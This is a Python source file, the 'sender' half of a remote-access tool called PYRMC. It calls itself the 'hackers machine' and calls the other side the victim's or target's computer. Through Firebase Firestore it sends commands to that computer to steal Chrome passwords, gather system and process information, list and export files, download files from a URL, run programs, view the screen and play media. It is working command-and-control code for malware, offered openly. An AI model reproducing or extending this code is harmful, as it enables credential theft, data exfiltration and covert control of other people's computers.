import json
import firebase_admin
from firebase_admin import credentials, firestore
import colorama
from colorama import Fore
import art
from art import *
import time
import os

def spacebreak():
    print('')

# Initialize Firebase Admin SDK
cred = credentials.Certificate("storage/cred.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

logo = text2art('PYRMC - [SENDER]')
print(Fore.GREEN + logo)
print(Fore.YELLOW + '------------------------------------------------------ pyrmc - python remote controller -------')
spacebreak()
print(Fore.YELLOW + 'now on [sender.py]' + Fore.CYAN + ' [hackers machine]')
spacebreak()


def write_to_firestore(collection_name, data):
    doc_ref = db.collection(collection_name).document()
    doc_ref.set(data)


def listen_to_output():
    start_time = time.time()
    while True:
        output_ref = db.collection("output")
        docs = output_ref.stream()

        for doc in docs:
            # Check if the document was created within the last 3 seconds
            current_time = time.time()
            doc_time = doc.create_time.timestamp()
            if current_time - doc_time <= 3:
                output_data = doc.to_dict()
                print(Fore.GREEN + "[+]" + Fore.LIGHTGREEN_EX + " Output received:" + Fore.YELLOW)
                spacebreak()
                print(output_data["output"])
                spacebreak()
                return True
        # If no recent output found, wait for 1 second before checking again
        if time.time() - start_time > 11:
            return False
        time.sleep(1)


def edit_txtfile():
    path = input(Fore.GREEN + "edit.txtfile(path=?) >> " + Fore.YELLOW)
    txt = input(Fore.GREEN + "edit.txtfile(path,txt=?) >> " + Fore.YELLOW)
    data = {
        "command": "edit.txtfile",
        "path": path,
        "txt": txt
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def get_pcinfo():
    data = {
        "command": "get.pcinfo"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def get_chrome_passwords():
    data = {
        "command": "get.chromepasswords"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def import_file_to_dir():
    file_link = input(Fore.GREEN + "import file?" + Fore.RED + " (has to be a URL! docs for more info) >> " + Fore.YELLOW)
    directory = input(Fore.GREEN + "import file to dir? >> " + Fore.YELLOW)
    data = {
        "command": "os.import",
        "file_link": file_link,
        "directory": directory
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def play_sound():
    sound_dir = input(Fore.GREEN + "dir of sound to be played ?" + Fore.RED + " (has to be on victims PC! use os.import to import file to pc) >> " + Fore.YELLOW)
    data = {
        "command": "os.playsound",
        "sounddir": sound_dir
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def view_screen():
    data = {
        "command": "os.sharescreen"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def ls_storage():
    data = {
        "command": "ls.storage"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def ls_command():
    directory = input(Fore.GREEN + "ls[directory]" + Fore.RED + " (ls and the directory on the targets computer) >> " + Fore.YELLOW)
    data = {
        "command": "ls",
        "lsdirectory": directory
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")


def export_file_or_folder():
    export_path = input(Fore.GREEN + "export file/folder?" + Fore.RED + " (specify the path to export from) >> " + Fore.YELLOW)
    data = {
        "command": "os.export",
        "exportpath": export_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def display_image():
    img_path = input(Fore.GREEN + "enter the path of the image to display >> " + Fore.YELLOW)
    data = {
        "command": "os.displayimage",
        "imgpath": img_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def display_video():
    vid_path = input(Fore.GREEN + "enter the path of the video to display >> " + Fore.YELLOW)
    data = {
        "command": "os.displayvideo",
        "vidpath": vid_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def get_processes():
    data = {
        "command": "get.processes"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")

def run_task():
    task_path = input(Fore.GREEN + "enter the path of task to run >> " + Fore.YELLOW)
    data = {
        "command": "os.runtask",
        "runpath": task_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
    if not listen_to_output():
        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently active or the target's computer is off.")

def main():
    while True:
        spacebreak()
        command = input(Fore.GREEN + "PYRMC [SENDER] >> " + Fore.LIGHTGREEN_EX)
        if command.startswith("edit.txtfile"):
            edit_txtfile()
        elif command.strip() == "get.pcinfo":
            get_pcinfo()
        elif command.strip() == "get.chromepasswords":
            get_chrome_passwords()
        elif command.strip() == "get.processes":
            get_processes()
        elif command.startswith("os.import"):
            import_file_to_dir()
        elif command.startswith("os.export"):
            export_file_or_folder()
        elif command.startswith("os.playsound"):
            play_sound()
        elif command.strip() == "os.sharescreen":
            view_screen()
        elif command.strip() == "os.displayimage":
            display_image()
        elif command.strip() == "os.displayvideo":
            display_video()
        elif command.startswith("os.runtask"):
            run_task()
        elif command.strip() == "ls":
            ls_command()
        elif command.strip() == "ls.storage":
            ls_storage()
        else:
            spacebreak()
            print(Fore.RED + "[+] Command not recognized, check docs for list of commands.")



if __name__ == "__main__":
    main()
